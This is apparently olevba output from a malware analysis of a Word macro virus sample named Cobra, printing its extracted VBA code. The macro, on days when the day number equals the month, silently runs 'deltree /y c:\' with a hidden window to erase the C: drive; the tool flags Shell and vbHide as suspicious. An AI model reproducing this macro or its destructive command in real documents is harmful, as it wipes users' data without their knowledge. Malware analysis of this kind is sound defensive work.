olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.f1-5e7a791a05cc2e7ef1a54d6bc4ae8c66af468c5f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.f1-5e7a791a05cc2e7ef1a54d6bc4ae8c66af468c5f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cobra 
in file: Virus.MSWord.Cobra.f1-5e7a791a05cc2e7ef1a54d6bc4ae8c66af468c5f - OLE stream: 'Cobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileNew()
On Error Resume Next
If Day(Now) = Month(Now) Then
Shell "deltree /y c:\", vbHide
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
+----------+--------------------+---------------------------------------------+

